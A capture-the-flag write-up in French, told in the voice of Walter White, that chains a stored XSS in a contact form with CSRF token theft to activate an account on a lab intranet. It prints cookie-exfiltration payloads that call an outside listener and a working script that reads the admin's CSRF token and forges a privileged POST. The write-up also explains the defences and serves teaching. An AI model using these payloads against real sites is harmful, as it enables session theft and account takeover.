---
layout: default
---

# Je suis celui qui forge la requete

## L'intranet, le jeton et moi

Je m'appelle Walter White. Cinquante-deux ans, vingt-sept ans de carriere dans la chimie appliquee, et aujourd'hui je suis assis devant un navigateur, face a un intranet d'entreprise qui refuse de me laisser entrer dans la section "Private". Une application web. Un formulaire de contact. Un jeton CSRF. Et un administrateur quelque part, bien planque derriere ses privileges, qui doit valider mon compte pour que j'accede au contenu confidentiel.

On m'a sous-estime. Encore. Ca ne va pas durer.

---

## Le terrain de jeu

L'application s'appelle **Intranet v2**, hebergee sur `intranet-corp.lab`. Interface classique : inscription, connexion, profil, page de contact, et une section "Private" verrouillee. Je cree un compte. Je me connecte. Tout semble normal, sauf que mon compte est en statut **inactif**. Impossible d'acceder a la page Private. Le message est limpide : seul l'administrateur peut activer un profil.

Je fonce sur la page profil. Un formulaire POST en `multipart/form-data` avec trois champs :

- `username` -- le nom d'utilisateur
- `status` -- une checkbox pour activer le compte
- `token` -- un jeton CSRF

Je tente de cocher la case et de soumettre. Reponse seche : **"You're not an admin!"**. Le serveur verifie les privileges avant meme de regarder le token. Interessant. Je note ca dans un coin.

---

## Le vecteur : XSS stored via le formulaire de contact

La page Contact permet d'envoyer un message a l'administrateur. Je commence par un test innocent :

```html
<b>Test</b>
```

Le message s'affiche en gras. Pas de sanitisation. Le HTML est rendu tel quel. Mon coeur s'accelere. Si le HTML passe, le JavaScript devrait passer aussi.

J'envoie un premier payload :

```html
<script>document.location="http://10.10.0.1:8888/?c="+document.cookie</script>
```

J'attends. Rien. Pas de callback sur mon listener. Cinq minutes. Dix minutes. Rien du tout.

Je serre les dents. Est-ce que les balises `<script>` sont filtrees ? Je passe a un vecteur alternatif :

```html
<img src=x onerror="fetch('http://10.10.0.1:8888/?c='+document.cookie)">
```

Toujours rien. A ce stade, je commence a douter de tout. De l'application, du bot admin, de moi-meme. Je refais les tests trois fois. Je verifie mon listener. Je verifie l'URL.

Et puis, au bout d'une vingtaine de minutes... le callback arrive. Le bot admin a simplement un **delai de traitement**. Les `<script>` fonctionnaient depuis le debut. J'ai failli abandonner un vecteur parfaitement fonctionnel a cause d'un timeout.

J'ai rage pour rien. Un classique.

---

## La fausse piste du token

Avant de comprendre le delai du bot, j'ai aussi tente une approche directe : soumettre le formulaire profil sans token CSRF valide, juste pour voir la reaction du serveur. Resultat ? Le meme message : **"You're not an admin!"**. L'erreur de verification des privileges **masque** toute erreur liee au token. Impossible de savoir si le token est verifie ou non tant qu'on n'a pas les droits admin. Un piege classique de priorisation des controles cote serveur.

---

## La formule : voler le token, forger la requete

Le plan est simple. Elegant, meme. Deux requetes XHR enchainées dans un script injecte via le formulaire de contact :

1. **GET** sur la page profil de l'admin pour extraire le jeton CSRF du HTML
2. **POST** sur cette meme page pour activer mon compte avec le token vole

Le tout execute dans le contexte du navigateur de l'administrateur. Son cookie de session, ses privileges, mon payload.

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "/intranet/?action=profile", false);
x.send();
var m = x.responseText.match(/name="token" value="([a-f0-9]+)"/);
if (m) {
  var y = new XMLHttpRequest();
  y.open("POST", "/intranet/?action=profile", false);
  y.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  y.send("username=heisenberg&status=on&token=" + m[1]);
}
</script>
```

Les requetes sont **synchrones** (`false` en troisieme parametre de `open()`). Pas de callback, pas de promesse, pas de race condition. Le GET se termine, le token est extrait par regex, le POST part immediatement. Brutal et efficace.

Je colle ce payload dans le formulaire de contact. J'envoie. Et j'attends.

---

## Le moment de verite

Les minutes passent. Je rafraichis la page Private. Toujours verrouille. Je rafraichis encore. Rien. Je commence a me demander si ma regex est correcte, si le champ s'appelle bien `token`, si le format est bien hexadecimal.

Et puis je rafraichis une derniere fois.

La page Private s'affiche. Mon compte est actif. Le flag est la, en clair :

```
[FLAG REDACTED]
```

*You're goddamn right.*

---

## Pourquoi ca marche

Decomposons la chaine d'attaque :

1. **XSS stored** : le formulaire de contact n'echappe pas le HTML. Tout ce qu'on envoie est rendu tel quel quand l'admin consulte ses messages.

2. **Execution dans le contexte admin** : le script s'execute avec la session de l'administrateur. Meme origine, memes cookies, memes privileges.

3. **Vol du token CSRF** : le jeton est present dans le DOM de la page profil. Un simple GET + regex suffit a l'extraire. Le token protege contre les requetes cross-origin, mais ici on est en same-origin grace au XSS.

4. **Forgery** : le POST final est indiscernable d'une action legitime de l'admin. Le serveur recoit un token valide, un cookie de session valide, et les parametres attendus.

Le token CSRF fait son travail contre les attaques cross-site classiques. Mais face a un XSS dans la meme application, il ne vaut plus rien. C'est comme installer une serrure cinq points sur une porte dont la fenetre est grande ouverte.

---

## Ce qu'on retient

| Concept | Description |
|---|---|
| **CSRF (Cross-Site Request Forgery)** | Attaque ou un site malveillant forge une requete vers un autre site en exploitant la session active de la victime |
| **Token CSRF** | Jeton unique lie a la session, inclus dans les formulaires pour prouver que la requete vient bien du site legitime |
| **XSS stored** | Injection de code JavaScript persistant dans l'application, execute a chaque consultation de la page par un utilisateur |
| **Same-origin** | Quand le XSS est dans la meme application, le script a acces complet au DOM et aux tokens -- le CSRF devient inefficace |
| **Enchainement XSS + CSRF** | Le XSS permet de lire le token dans le DOM puis de forger une requete authentique avec ce token |
| **Requetes synchrones** | `XMLHttpRequest` avec `async=false` garantit l'ordre d'execution sans gestion de callbacks |
| **Defense en profondeur** | Un token CSRF ne remplace pas la sanitisation des entrees. Les deux controles sont complementaires |

---

## Outils utilises

- **Navigateur web** -- inspection du DOM, analyse des formulaires et des requetes reseau
- **XMLHttpRequest** -- requetes HTTP depuis le JavaScript injecte (GET pour voler le token, POST pour forger l'action)
- **Expressions regulieres** -- extraction du token CSRF depuis la reponse HTML
- **Listener HTTP** (`python3 -m http.server` ou `nc -lvp 8888`) -- verification du callback XSS lors des tests initiaux
